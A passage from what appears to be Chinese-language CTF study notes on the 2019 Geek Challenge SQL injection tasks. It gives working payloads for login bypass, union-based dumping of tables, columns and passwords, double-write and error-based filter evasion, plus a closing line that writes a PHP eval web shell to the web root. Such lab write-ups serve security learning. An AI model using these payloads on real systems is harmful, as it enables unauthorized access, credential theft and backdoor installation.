万能密码传入，我们的账号密码不对（or前面），就**会执行or后面的'1'='1'这是一个恒真**的，我们使用错误的账号密码来达到了登录成功的目的

#### 思考

payload

```
admin' or 1=1 #		//用户名直接输入，密码随便输
```



### [极客大挑战 2019]LoveSQL

#### 考点：union联合注入

#### 思考

查看有几个字段，发现有3个字段

```
?username=admin' order by 3%23&password=1
```

爆库：库名为`geekuser`

```
?username=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=1
```

爆表

发现有两张表：geekuser，l0ve1ysq1

```
?username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=1
```

爆字段

l0ve1ysq1这张表很奇怪，先选择查这个

发现有3列：'id,username,password'

```
?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'%23&password=1
```

爆值

发现flag

```
?username=1' union select 1,2,group_concat(id,'~',username,'&',password) from l0ve1ysq1 %23&password=1
```



### [极客大挑战 2019]BabySQL

#### 考点：union+双写绕过

注意双写绕过，union，select，where，from，information（infoorrmation），password（passwoorrd）

#### 思考

查看有几个字段，发现有3个字段

```
?username=0' ununionion seselectlect 1,2,3%23&password=xx
```

爆库：库名为`geek`

```
?username=0' ununionion seselectlect 1,2,database()%23&password=xx
```

爆表

表名为：`b4bsql`，`geekuser`

```
?username=1' ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema = 'geek'%23&password=xx
```

爆字段

首先爆表：`b4bsql`

发现有3列：id,username,password

```
?username=1' ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name="b4bsql"%23&password=xx
```

爆值

```
?username=1' ununionion seselectlect 1,2,group_concat(id,'~',username,':',passwoorrd) frofromm b4bsql%23&password=xx
```



### [极客大挑战 2019]HardSQL

#### 考点：报错+括号绕过空格+like绕过=

#### 思考

需要绕过这些关键字去注入，空格用括号代替，等号用like代替

爆库：库名为：geek

```
?username=0'or(updatexml(1,concat('~',database(),'~'),1))%23&password=xx
```

爆表：表名：H4rDsq1

```
?username=0'or(updatexml(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),'~'),1))%23&password=xx
```

爆字段：id,username,password

```
?username=0'or(updatexml(1,concat('~',(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),'~'),1))%23&password=xx
```

爆值

```
?username=0'or(updatexml(1,concat('~',(select(group_concat((left(password,25))))from(H4rDsq1)),'~'),1))%23&password=xx
//再用right()看后半部分,这里好像不太能使用floor型的报错
```





## SQLShell

```
id=l' union select 1,2," <?php @eval($_POST['x']);?>" into outfile "/var/www/html/cmd. php%23
```

